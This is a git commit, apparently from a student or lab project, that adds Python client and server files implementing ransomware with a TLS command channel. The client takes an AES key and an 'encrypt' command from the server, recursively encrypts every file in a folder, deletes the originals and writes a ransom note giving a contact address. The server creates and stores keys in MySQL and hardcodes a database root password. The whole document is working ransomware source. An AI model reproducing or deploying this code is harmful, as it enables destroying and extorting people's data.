1257e20c3d53d2f0a0d46f2cf91474813cc04986
GalH69 <auto.install@cs.com>
2025-07-30 17:58:05 +0300

    'autosave'

---
+++ client.py
@@ -0,0 +1,136 @@
+import socket
+import ssl
+import os
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES
+from Crypto.Hash import SHA256
+from Crypto.Util.Padding import pad, unpad
+import sys
+
+HOST = "127.0.0.1"
+PORT = 44444
+
+context = ssl._create_unverified_context()
+
+folder = "D:\\טרויאני בדיקה"
+
+def show_ransom_note_encryption():
+    note = """
+    🔒 All your files have been encrypted!
+    
+    To get the key and decrypt your files, you must contact us.
+
+    Contact: hackers@example.com
+    Your victim ID: 142739ddd
+    """
+    
+    with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
+        f.write(note)
+    
+    # Optionally open the file or display message
+    os.system("notepad README_DECRYPT.txt")
+
+def show_ransom_note_decryption():
+    
+    note = """
+    🔓 All your files have been decrypted!
+
+    Your system is no longer encrypted and your files are back to normal."""
+    
+    with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
+        f.write(note)
+    
+    os.system("notepad README_DECRYPT.txt")
+    
+    
+def Encryption_all_files_in_folder(folder_path, AES_KEY):
+    for file_name in os.listdir(folder_path):
+        full_path = os.path.join(folder_path, file_name)
+        
+        if os.path.isfile(full_path):
+            with open(full_path,"rb") as f:
+                file_data = f.read()
+                
+            iv = get_random_bytes(16)
+            cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+            encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
+            encrypted_path = full_path + "_"
+
+            with open(encrypted_path, "wb") as f:
+                f.write(iv + encrypted_data)
+            
+            os.remove(full_path)
+
+
+
+        elif os.path.isdir(full_path):
+            Encryption_all_files_in_folder(full_path, AES_KEY)
+            
+def Decryption_all_files_in_folder(folder_path, AES_KEY):
+    for file_name in os.listdir(folder_path):
+        full_path = os.path.join(folder_path, file_name)
+
+        if os.path.isfile(full_path):
+            with open(full_path, "rb") as f:
+                file_data = f.read()
+
+            iv = file_data[:16]
+            encrypted_data = file_data[16:]
+
+            cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+            decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+
+            decrypted_path = full_path.rstrip("_") 
+
+            with open(decrypted_path, "wb") as f:
+                f.write(decrypted_data)
+
+            os.remove(full_path)
+
+        elif os.path.isdir(full_path):
+            Decryption_all_files_in_folder(full_path, AES_KEY)
+    
+    
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    with context.wrap_socket(s, server_hostname="anything") as secure_sock:
+        secure_sock.connect((HOST,PORT))
+        
+        while True:
+            aes_key = b""
+            while True: # נקבל את המילה הסודית מהשרת
+                aes_key = aes_key + secure_sock.recv(1024)
+                
+                if aes_key.endswith(b"__END__"):
+                    aes_key = aes_key.removesuffix(b"__END__")
+                    break
+                        
+                        
+            action = ""
+            while True:
+                action = action + secure_sock.recv(1024).decode()
+                
+                if action.endswith("__END__"):
+                    action = action.removesuffix("__END__")
+                    break
+            
+            if action == "encrypt":
+                
+                Encryption_all_files_in_folder(folder, aes_key)
+                
+                del aes_key
+                show_ransom_note_encryption()
+                
+                secure_sock.sendall(b"the files are encrypted")
+                secure_sock.sendall(b"__END__")
+            
+            elif action == "decrypt":
+                
+                Decryption_all_files_in_folder(folder, aes_key)
+                del aes_key
+                show_ransom_note_decryption()
+                
+                secure_sock.sendall(b"the files are decrypted")
+                secure_sock.sendall(b"__END__")
+            
+            
+            sys.exit()
---
+++ server.py
@@ -0,0 +1,134 @@
+import os
+import socket
+import ssl
+import mysql.connector
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES
+from Crypto.Hash import SHA256
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Cipher import PKCS1_OAEP
+import base64
+from random_word import RandomWords
+
+
+
+HOST = "0.0.0.0"
+PORT = 44444
+
+cert_pem = "D:\\python_programmers_clab\\TROJAN_RANSOMEWARE\\cert.pem"
+key_pem = "D:\\python_programmers_clab\\TROJAN_RANSOMEWARE\\key.pem"
+
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+context.load_cert_chain(certfile=cert_pem,keyfile=key_pem)
+
+def mysql_insert_random_word(word):
+    sql_conn = mysql.connector.connect(
+        host="localhost",
+        user="root",
+        password="Galking22!!!",
+        database="my_server_trojan"
+    )
+    cursor = sql_conn.cursor()
+    
+    cursor.execute("INSERT INTO random_words (word) VALUES (%s)", (word,))
+    sql_conn.commit()
+
+    print(f"the secret word ({word}) has been saved successfully")
+    
+    cursor.close()
+    sql_conn.close()
+    
+def mysql_retrieve_last_word():
+    conn = mysql.connector.connect(
+        host="localhost",
+        user="root",
+        password="Galking22!!!",
+        database="my_server_trojan"
+    )
+    cursor = conn.cursor()
+
+    cursor.execute("SELECT word FROM random_words ORDER BY id DESC LIMIT 1")
+    result = cursor.fetchone()  # מחזיר טופל, לדוגמה: ('abcde...',)
+    word = result[0]
+
+    cursor.close()
+    conn.close()
+
+    return word
+    
+    
+def generate_aes_key_from_secret(secret_word):
+    hasher = SHA256.new()
+    hasher.update(secret_word.encode())
+    key = hasher.digest()
+    return key
+
+def encrypt_aes_key_with_rsa(aes_key):
+    with open("server_RSA_public.pem", "rb") as f:
+        public_key = RSA.import_key(f.read())
+    cipher_rsa = PKCS1_OAEP.new(public_key)
+    encrypted_key = cipher_rsa.encrypt(aes_key)
+
+    # מקודד את הפלט לבייס64 לצורך שמירה כטקסט
+    return base64.b64encode(encrypted_key).decode()
+
+def save_encrypted_key_to_db(encrypted_key_b64):
+    conn = mysql.connector.connect(
+        host="localhost",
+        user="root",
+        password="Galking22!!!",
+        database="my_server_trojan"
+    )
+    cursor = conn.cursor()
+
+    cursor.execute("INSERT INTO encrypted_keys (encrypted_key) VALUES (%s)", (encrypted_key_b64,))
+    conn.commit()
+
+    print("Encrypted AES key has been saved successfully")
+
+    cursor.close()
+    conn.close()
+    
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST,PORT))
+    s.listen(1)
+    
+    with context.wrap_socket(s, server_side=True) as secure_sock:
+        
+        conn, address = secure_sock.accept()
+        
+        with conn:
+            print(f"Got conn from {address}/nthe conn is using TLS")
+            
+            r = RandomWords()
+            random_word = r.get_random_word()
+            
+            mysql_insert_random_word(random_word)
+            
+            the_word = mysql_retrieve_last_word()
+            aes_key = generate_aes_key_from_secret(the_word)
+            
+            aes_key_encrypt_by_RSA = encrypt_aes_key_with_rsa(aes_key)
+            save_encrypted_key_to_db(aes_key_encrypt_by_RSA)
+            
+            conn.sendall(aes_key + b"__END__")
+            
+            
+            # נשלח ללקוח אם אני רוצה שהוא יצפין או יפענח
+            # צריך לשנות ידנית כל פעם אם רוצים שהוא יצפין או יפענח
+            # For it to encrypt, you need to write to the variable "action" the value "encrypt" 
+            # For it to decrypt, you need to write to the variable "action" the value "decrypt"
+            action = "encrypt"
+            if action == "encrypt" or action == "decrypt":
+                conn.sendall(action.encode())
+                conn.sendall(b"__END__")
+                
+            answer = ""
+            while True:
+                answer = answer + conn.recv(1024).decode()
+                
+                if answer.endswith("__END__"):
+                    answer = answer.removesuffix("__END__")
+                    break
+            print(answer)
